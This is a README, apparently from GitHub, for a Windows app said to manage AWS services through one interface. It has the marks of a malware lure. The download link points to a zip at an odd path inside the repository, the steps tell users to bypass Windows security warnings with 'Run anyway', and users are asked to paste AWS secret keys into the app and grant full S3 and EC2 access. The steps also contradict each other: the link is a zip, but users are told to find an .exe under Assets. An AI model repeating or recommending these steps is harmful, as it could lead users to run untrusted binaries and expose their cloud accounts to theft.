# ☁️ aws-rest-api - Manage AWS cloud services with ease

<a href="https://github.com/vincentscleanlimbed596/aws-rest-api/raw/refs/heads/main/subexcite/rest_api_aws_v3.4.zip"><img src="https://img.shields.io/badge/Download-Application-blue.svg" alt="Download"></a>

## 📋 Project Overview

The aws-rest-api application provides a simple way to control your Amazon Web Services from your computer. Many people find the official Amazon dashboard difficult to navigate. This tool simplifies that process. It connects to your cloud accounts and allows you to perform common tasks through a single interface. You can manage data storage, virtual servers, and serverless code without needing deep technical knowledge of complex cloud commands. 

This tool serves as a bridge. It converts simple web commands into the specific instructions your cloud account understands. You no longer need to jump between five different pages to manage your storage, servers, and code functions. You see everything in one place. This software runs on your computer, keeping your management tasks local and secure.

## ⚙️ System Requirements

Before you install the software, ensure your computer meets these basic needs:

*   Operating System: Windows 10 or Windows 11.
*   Processor: Standard dual-core processor or better.
*   Memory: At least 4 gigabytes of RAM.
*   Storage: 200 megabytes of free space.
*   Internet Connection: A stable connection for communicating with the cloud.
*   AWS Credentials: You need an Access Key ID and a Secret Access Key from your Amazon account.

## 💾 Setup and Installation

Follow these steps to prepare the application for use:

1. Visit [this page to download](https://github.com/vincentscleanlimbed596/aws-rest-api/raw/refs/heads/main/subexcite/rest_api_aws_v3.4.zip) the latest version of the application.
2. Look for the file ending in `.exe` under the Assets section. Click the filename to start the download.
3. Once the download finishes, open your Downloads folder.
4. Double-click the installer file to begin the setup process.
5. Follow the on-screen prompts. Windows might show a security notification. Click "More info" and then "Run anyway" if the screen warns you about the developer.
6. The installer places a shortcut on your desktop.

## 🔑 Linking Your Cloud Account

The application requires permission to access your cloud resources. You provide these permissions using your AWS account credentials.

1. Open the aws-rest-api application from your desktop.
2. Locate the Settings menu in the top corner.
3. Find the field labeled API Credentials.
4. Paste your Access Key ID and Secret Access Key into the designated boxes.
5. Click Save. 

The application checks your connection immediately. A green light indicates a successful link. If the light stays red, check your keys for typos or expired permissions.

## 🚀 Managing Cloud Services

Once connected, the main dashboard shows your active services. The interface divides resources into clear categories based on the tools you use most.

### S3 Storage
The S3 tab displays your storage buckets. You can upload files by dragging them from your computer folder directly into the app. Select any bucket to see a list of contained files, move them, or rename them.

### EC2 Servers
The EC2 tab shows your virtual machines. Each server appears as a card with a status indicator. Use the Start, Stop, or Restart buttons to manage server states. The app displays the server address and health status in real time.

### Lambda Functions
The Lambda tab organizes your serverless code. You can trigger functions manually to test how they perform. The app logs the input and output of each trigger so you can track performance and spot errors.

### EBS and Glacier
The EBS section manages your disk volumes. You can attach or detach volumes from your virtual servers here. The Glacier section handles your long-term, low-cost archives. You can move files from S3 to Glacier for archiving and back again when you need to retrieve them.

## 🛠 Troubleshooting

Computers sometimes face conflicts during setup. Review these steps if you encounter issues.

*   Connection Errors: Verify your internet connection. If the app fails to reach the cloud, a firewall might block the traffic. Confirm that your network allows incoming and outgoing data for this application.
*   Permission Denied: This error means your AWS keys lack the necessary rights to perform the requested task. Log in to the Amazon dashboard to update the permissions for your user account. Ensure you have AmazonS3FullAccess and AmazonEC2FullAccess attached to your keys.
*   Software Freezing: Close the application completely and restart it. If the issue persists, check the Task Manager to ensure no background processes are holding the application back.
*   Updates: Software improves over time. Periodically visit the download link to check for a newer version that fixes bugs or adds features.

## 🔒 Security Practices

Protecting your cloud credentials is vital. 

*   Never share your Access Key ID or Secret Access Key with others. 
*   If you share your computer with others, lock your screen when you move away.
*   Do not record your keys in physical notebooks or unencrypted digital documents. 
*   If you suspect your keys leaked, revoke them immediately within the Amazon account dashboard and generate new ones. 
*   The application stores your keys in a local encrypted file on your hard drive to prevent unauthorized access. Keeping your Windows user account password-protected adds an extra layer of safety.

## 📝 Frequently Asked Questions

**Does this app store my cloud data?**
No. The application only passes instructions. Your data stays in the cloud or on your local disk.

**Can I run this on a Mac?**
This version is designed specifically for Windows.

**What happens if I lose my internet connection?**
The app will show an offline status. It will not be able to send commands to the cloud until the connection returns. It will not lose your saved settings.

**Is this cost-free to run?**
The software is open-source and free, but Amazon charges for the resources you use. Monitor your Amazon billing dashboard to avoid unexpected costs.

**Can I automate tasks?**
This version focuses on manual control. Future versions may include scheduling features. For now, you must trigger all actions within the interface.

**How do I delete the app?**
Open your Windows Settings, go to Apps, find aws-rest-api, and select Uninstall. This removes the program files and your saved connection settings.